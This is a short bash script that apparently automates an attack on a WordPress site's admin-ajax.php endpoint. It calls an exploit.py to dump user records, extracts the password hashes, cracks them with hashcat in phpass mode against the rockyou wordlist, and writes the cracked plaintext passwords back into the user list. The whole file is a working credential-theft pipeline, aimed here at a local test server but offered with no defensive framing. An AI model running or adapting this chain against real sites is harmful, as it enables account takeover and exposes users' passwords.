#!/usr/bin/env bash

# set -x

mkdir -p results
./exploit.py http://127.0.0.1:8000/wp-admin/admin-ajax.php 2 -o results/exposed_users.txt
cut -d, -f3 results/exposed_users.txt > results/passwords.txt
hashcat -O -m 400 -a 0 -o results/cracked.txt results/passwords.txt rockyou.txt
cp results/exposed_users.txt results/users.txt

while read line; do
    hash=$(echo "$line" | cut -d: -f1)
    pass=$(echo "$line" | cut -d: -f2)
    sed -i "s/${hash//\//\\/}/$pass/g" results/users.txt 
done < results/cracked.txt